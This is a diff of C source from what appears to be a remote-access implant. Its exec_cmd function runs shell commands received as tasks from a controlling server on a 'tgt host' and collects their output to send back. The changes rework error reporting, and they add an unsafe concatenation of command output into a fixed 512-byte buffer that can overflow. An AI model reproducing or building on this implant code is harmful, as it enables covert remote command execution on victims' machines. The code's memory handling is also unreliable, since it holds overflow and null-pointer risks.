@@ -274,13 +274,16 @@ bool parse_tasks(char *response, struct tasks *task)
 // Executes a shell cmd.
 bool exec_cmd(struct tasks *task)
 {
-	if (!can_run_cmd(task->cmd)) {
-		printf("Command binary %s does not exist\n", task->cmd);
-		// Will need to update this portion here to copy
-		// failed results to task results, for posting
-		// back in main.
-		return false;
-	}
+    if (!can_run_cmd(task->cmd))
+    {
+        const char *no_binary_msg = "CMD Execution Failed: Command binary does not exist on tgt host.";
+        printf("Command binary %s does not exist\n", task->cmd);
+        task->results = strdup(no_binary_msg);
+        // Will need to update this portion here to copy
+        // failed results to task results, for posting
+        // back in main.
+        return false;
+    }
 
 	FILE *cmd_fptr = NULL;
 	char line[1024] = {'\0'};
@@ -289,7 +292,7 @@ bool exec_cmd(struct tasks *task)
 	char *tmp_space = NULL;
 
 	char space[1] = " ";
-	strncat(task->cmd, space, sizeof(1));
+	strncat(task->cmd, space, 1);
 	strncat(task->cmd, task->args, strlen(task->args));
 
 	printf("Task->cmd after concat is: %s", task->cmd);
@@ -298,7 +301,7 @@ bool exec_cmd(struct tasks *task)
 	{
 		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
 		{
-			size_t buf_len = strlen(line);
+			size_t buf_len = strlen(line) +1;
 			tmp_space = realloc(task->results, buf_len + cur_len + 1);
 			if (!tmp_space)
 			{
@@ -314,14 +317,17 @@ bool exec_cmd(struct tasks *task)
 	}
 	cmd_ret = pclose(cmd_fptr);
 	printf("The exit status is: %d\n", WEXITSTATUS(cmd_ret));
-	if (cmd_ret != 0)
-	{
-		printf("Failed to execute %s\n", task->cmd);
-		// Will need to update this portion here to copy
-		// failed results to task results, for posting
-		// back in main.
-		return false;
-	}
+    if (cmd_ret != 0)
+    {
+        char cmd_fail_msg[512] = "CMD Execution Failed: ";
+        printf("Failed to execute %s\n", task->cmd);
+        strncat(cmd_fail_msg, task->results, strlen(task->results) + 1);
+        task->results = strdup(cmd_fail_msg);
+        // Will need to update this portion here to copy
+        // failed results to task results, for posting
+        // back in main.
+        return false;
+    }
 
 	return true;
 }
